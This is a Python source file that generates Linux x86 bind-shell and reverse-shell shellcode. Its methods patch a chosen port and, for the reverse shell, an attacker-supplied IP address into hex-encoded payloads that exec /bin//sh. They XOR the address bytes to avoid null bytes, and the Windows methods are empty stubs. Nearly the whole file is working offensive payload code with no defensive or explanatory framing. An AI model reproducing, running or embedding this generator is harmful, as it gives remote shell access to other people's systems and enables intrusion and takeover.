import socket
import struct

class generate_bind_shell:
    """
    Generate bind shell shellcode
    """

    def windows_bind_tcp(port):
        """
        Replaces PORT
        """

    def linux_bind_tcp(port):
        """
        Replaces PORT
        """
        
        code =  ""
        code += "\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9"
        code += "\\x31\\xd2\\x50\\x50\\x50\\x66\\x68\\x11"
        code += "\\x5c\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01"
        code += "\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7"
        code += "\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb"
        code += "\\x89\\xe1\\x89\\xea\\x29\\xe2\\xcd\\x80"
        code += "\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb"
        code += "\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8"
        code += "\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2"
        code += "\\x31\\xf6\\xcd\\x80\\x89\\xc6\\xb1\\x03"
        code += "\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\x49\\xcd"
        code += "\\x80\\x41\\xe2\\xf4\\x31\\xc0\\x50\\x68"
        code += "\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69"
        code += "\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80"

        port = hex(socket.htons(int(port)))
        code = code.replace("\\x11\\x5c", "\\x{b1}\\x{b2}".format(b1 = port[4:6], b2 = port[2:4]))

        return code

class generate_reverse_shell:
    """
    Generate reverse shell shellcode
    """

    def windows_reverse_tcp(ip, port):
        """
        Replaces IP and PORT
        """

    def linux_reverse_tcp(ip, port):
        """
        Replaces IP and PORT
        """

        code =  ""
        code += "\\x89\\xe5\\x31\\xc0\\x31\\xc9\\x31\\xd2"
        code += "\\x50\\x50\\xb8\\xff\\xff\\xff\\xff\\xbb"
        code += "\\x80\\xff\\xff\\xfe\\x31\\xc3\\x53\\x66"
        code += "\\x68\\x11\\x5c\\x66\\x6a\\x02\\x31\\xc0"
        code += "\\x31\\xdb\\x66\\xb8\\x67\\x01\\xb3\\x02"
        code += "\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x66\\xb8"
        code += "\\x6a\\x01\\x89\\xe1\\x89\\xea\\x29\\xe2"
        code += "\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0"
        code += "\\xb0\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf6"
        code += "\\x31\\xc0\\x31\\xd2\\x50\\x68\\x2f\\x2f"
        code += "\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89"
        code += "\\xe3\\xb0\\x0b\\xcd\\x80"

        ip = socket.inet_aton(ip)
        port = hex(socket.htons(int(port)))

        # Find valid XOR byte
        byte1 = port[4:]
        if byte1 == '':
            byte1 = '0'
        byte2 = port[2:4]
        
        ip_bytes = []
        xor_bytes = []
        ip_bytes.append(hex(struct.unpack('>L',ip)[0]).rstrip('L')[2:][-2:])
        ip_bytes.append(hex(struct.unpack('>L',ip)[0]).rstrip('L')[2:][-4:-2])
        ip_bytes.append(hex(struct.unpack('>L',ip)[0]).rstrip('L')[2:][-6:-4])
        ip_bytes.append(hex(struct.unpack('>L',ip)[0]).rstrip('L')[2:][:-6])
        for b in range(0, 4):
            for k in range(1, 255):
                    # Make sure there is no null byte
                    if int(ip_bytes[b], 16) ^ k != 0:
                            ip_bytes[b] = hex(int(ip_bytes[b], 16) ^ k)[2:]
                            xor_bytes.append(hex(k)[2:])
                            break

        # Inject the port number
        code = code.replace("\\x66\\x68\\x11\\x5c", "\\x66\\x68\\x{}\\x{}".format(
            byte1,
            byte2
        ))

        # Inject the XOR bytes
        code = code.replace("\\xb8\\xff\\xff\\xff\\xff", "\\xb8\\x{x1}\\x{x2}\\x{x3}\\x{x4}".format(
            x1 = xor_bytes[3],
            x2 = xor_bytes[2],
            x3 = xor_bytes[1],
            x4 = xor_bytes[0]
        ))

        # Inject IPv4 address
        code = code.replace("\\xbb\\x80\\xff\\xff\\xfe", "\\xbb\\x{b1}\\x{b2}\\x{b3}\\x{b4}".format(
            b1 = ip_bytes[3],
            b2 = ip_bytes[2],
            b3 = ip_bytes[1],
            b4 = ip_bytes[0]
        ))

        return code